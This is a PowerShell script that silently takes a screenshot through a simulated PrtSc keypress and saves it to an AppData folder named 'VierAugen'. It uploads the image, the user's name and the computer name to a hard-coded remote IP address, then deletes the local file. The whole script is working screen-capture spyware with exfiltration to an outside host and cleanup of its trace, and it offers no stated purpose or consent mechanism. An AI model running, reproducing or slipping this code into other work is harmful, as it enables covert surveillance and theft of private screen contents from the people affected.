Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

$jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatDescription -eq "JPEG" }

Start-Sleep -Milliseconds 250
[Windows.Forms.Sendkeys]::SendWait("{PrtSc}")
Start-Sleep -Milliseconds 250
$bitmap = [Windows.Forms.Clipboard]::GetImage()

$ep = New-Object Drawing.Imaging.EncoderParameters
$ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)

$screenCapturePathBase = "$env:appdata\\VierAugen\\screenshot"

$bitmap.Save("${screenCapturePathBase}", $jpegCodec, $ep)

$Uri = "http://89.221.217.68/VierAugen/api.php"

$wc = New-Object System.Net.WebClient

$data = New-Object System.Collections.Specialized.NameValueCollection

$data.Add("action", "upload")
$data.Add("username", $env:username)
$data.Add("computername", $env:computername)

$hash = (Get-FileHash $screenCapturePathBase).Hash
$data.Add("hash", $hash)

$wc.QueryString = $data;

$wc.Headers.add("Content-Type", "binary/octet-stream")

$res = $wc.UploadFile($Uri, "POST", $screenCapturePathBase)

Remove-Item -Path $env:appdata\\VierAugen\\screenshot -Force